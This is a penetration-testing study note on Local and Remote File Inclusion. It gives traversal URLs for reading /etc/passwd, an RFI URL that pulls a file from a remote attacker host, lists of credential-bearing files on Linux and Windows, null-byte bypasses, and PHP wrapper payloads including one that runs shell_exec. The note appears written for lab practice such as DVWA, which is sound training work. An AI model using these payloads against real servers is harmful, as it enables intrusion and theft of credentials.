---
title: "LFI and RFI"
classes: single
ribbon: LightBlue
categories:
  - notes
tags:
  - beginner
  - pentest
  - recon
  - oscp
  - https
  - http
  - web
  - lfi
  - rfi
toc: true
hide_title: true
excerpt: ""
---

# LFI Basics

Local File Inclusion (LFI) vulnerabilities allow an attacker to use specifically crafted requests to read local files on the web server (including log files and configuration files containing password hashes or even clear text passwords). LFI vulnerabilities can also lead to remote code execution on the target web server and a denial of service (DoS). Most, if not all, web application frameworks support file inclusion and file inclusion vulnerabilities are often the result of poor user input validation.

- We can simply pull out lfi with following syntax :

Consider this example

`http://192.168.119.13/include?page=index.php`

It calling **index.php** through php function so we can try if it can able to call and print other files too for us

`http://192.168.119.13/include?page=/etc/passwd`

`http://192.168.119.13/include?page=../../../../../etc/passwd`

And if we got **/etc/passwd** output back , target is vulnerable to **LFI**

# RFI Basic

- RFI stands for Remote File Inclusion. Where LFI includes files on stored on the local system, RFI includes files from remote locations, on a web server for example. Let’s see if we can include a remote file too on the DVWA application by entering an external URL in the page parameter. For this demonstration we have loaded a text file named exploit.txt on a remote server with the IP address 172.16.1.4 (because the text file is on a remote server we don’t have to work with a current working directory with the ../ value but we can reference it directly):
- Remote File Inclusions (RFI) are very similar to LFI but affect files on remote servers instead of files on the local web server. Remote files can include malicious code that executes on the server in the context of the user running the web server or on any client devices that visit a compromised webpage.

We can exploit rfi with adding our own shell at the end of vulnerable endpoint , something like this

`http://10.11.1.250/dvwa/vulnerabilities/fi/?page=http://172.16.1.4/exploit.txt`

### Required Settings to work RFI
![[image 1.avif]]

The first warning indicates that URL file-access is disabled in the server configuration. Without URL file access enabled we’re unable to include files from remote locations, such as our attack box.**To successfully include remote files in PHP there are a few parameters in the "php.ini" file that must be enabled:**

**allow_url_fopen = On**

**allow_url_include = On**

This settings can be found on **phpinfo.php** page so we can check if following configuration is allowed or not to successfully attack rfi

`http://10.11.1.250/dvwa/phpinfo.php`

# Interesting Files Linux

```
/etc/passwd

/etc/shadow

/etc/issue

/etc/group

/etc/hostname
```

## Log Files

```
 Apache access log: /var/log/apache/access.log
 
 Apache access log: /var/log/apache2/access.log
 
 Apache access log: /var/log/httpd/access_log
 
 Apache error log: /var/log/apache/error.log
 
 Apache error log: /var/log/apache2/error.log
 
 Apache error log: /var/log/httpd/error_log
 
 General messages and system related entries: /var/log/messages
 
 Cron logs: /var/log/cron.log
 
 Authentication logs: /var/log/secure or /var/log/auth.log
```

## CMS configuration files

```
WordPress: /var/www/html/wp-config.php

Joomla: /var/www/configuration.php

Dolphin CMS: /var/www/html/inc/header.inc.php

Drupal: /var/www/html/sites/default/settings.php

Mambo: /var/www/configuration.php

PHPNuke: /var/www/config.php

PHPbb: /var/www/config.php
```

# Interesting Files Windows

`To verify LFI on Windows systems a very common file we can attempt to include is the hosts file in the following directory:`

```
C:/Windows/System32/drivers/etc/hosts
```

From the privilege escalation chapter, we’ve learned that the ‘Unattended.xml’ files on Windows systems may contain credentials for privileged accounts, such as the administrator or even the domain administrator. If an attacker is able to include such files it could easily result in (domain) administrator access to the system or network, for example by using the credentials to authenticate with Remote Desktop Services.

The following files of interest can (sometimes) be found on Windows systems which may contain passwords and other sensitive information:

```
C:/Windows/Panther/Unattend/Unattended.xml

C:/Windows/Panther/Unattended.xml

C:/Windows/Panther/Unattend.txt

C:/Unattend.xml

C:/Autounattend.xml

C:/Windows/system32/sysprep
```

Another directory with potentially interesting files is the web root directory:

```
C:/inetpub/wwwroot/

C:/inetpub/wwwroot/web.config

C:/inetpub/logs/logfiles/
```

The following files of interest can (sometimes) be found on Windows systems:

```
C:/documents and settings/administrator/desktop/desktop.ini

C:/documents and settings/administrator/ntuser.dat

C:/documents and settings/administrator/ntuser.ini

C:/users/administrator/desktop/desktop.ini

C:/users/administrator/ntuser.dat

C:/users/administrator/ntuser.ini

C:/windows/windowsupdate.log
```

## XAMPP

```
 C:/xampp/apache/conf/httpd.conf
 
 C:/xampp/security/webdav.htpasswd
 
 C:/xampp/apache/logs/access.log
 
 C:/xampp/apache/logs/error.log
 
 C:/xampp/tomcat/conf/tomcat-users.xml
 
 C:/xampp/tomcat/conf/web.xml
 
 C:/xampp/webalizer/webalizer.conf
 
 C:/xampp/webdav/webdav.txt
 
 C:/xampp/apache/bin/php.ini
 
 C:/xampp/apache/conf/httpd.conf
```

# Null Byte Injection

- **Useful in case where php adding extension at the end of file name**
- In some specific cases you need to add a null byte terminator to the LFI/RFI vulnerable parameter. **A Null byte is a byte with the value zero (%00 or 0x00 in hex) and represents a string termination point or delimiter character.** Adding a null byte to a payload can alternate intended program logic as **it immediately stops the string from further processing any bytes after the null byte. This means that any bytes after the null byte delimiter will be ignored.**
## Example

Let's consider following code:

```
$file = $_GET['page']; 
require_once("/var/www/$file.php");
```

Now if we inject /etc/passwd in it , it will look something like this -

```
passwd = $_GET['page']; 
require_once("/var/www/../../../etc/passwd.php");
```

In this case **we cannot conduct File Inclusion with the passwd file because the second line appends a PHP extension to the file name and effectively converts the passwd file to passwd.php** which would result in a ‘file not found error’. In such a case, **we can add a null byte to the passwd file name to terminate the string at the null byte and discard the ‘.php’ extension.**

## Null Byte

```
http://website/page=../../../etc/passwd%00

http://example.com/page=../../../../../../etc/passwd?

/etc/passwd%00jpg     
```

# PHP Wrappers

PHP provides several protocol wrappers that we can use to exploit directory traversal and local file inclusion. These filters give us additional flexibility when attempting to inject PHP code via LFI vulnerabilities.

## Identifying Vulnerability

```
http://192.168.112.132/menu.php?file=data:text/plain,helloworld
```

IF this payload return **helloworld** then we can use php wrappers to execute php commands too

## Executing commands

```
http://192.168.112.132/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

## php filter

Another PHP wrapper, `php://filter` in this example the output is encoded using base64, so you’ll need to decode the output.

```
http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../..
```